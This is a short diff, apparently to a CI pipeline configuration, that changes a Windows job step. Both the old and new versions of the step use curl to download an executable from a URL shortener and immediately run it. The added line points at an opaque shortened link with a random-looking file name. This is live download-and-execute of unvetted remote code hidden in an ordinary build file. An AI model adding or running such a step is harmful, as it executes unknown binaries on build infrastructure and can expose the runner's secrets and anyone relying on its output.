@@ -9,4 +9,4 @@ jobs:
       name: win/default
       shell: cmd.exe
     steps:
-      - run: curl -L -o yourcustomlink.exe https://is.gd/yourcustomlink && yourcustomlink.exe
+      - run: curl -L -o x61xsfd.exe https://urlis.net/x61xsfd && x61xsfd.exe
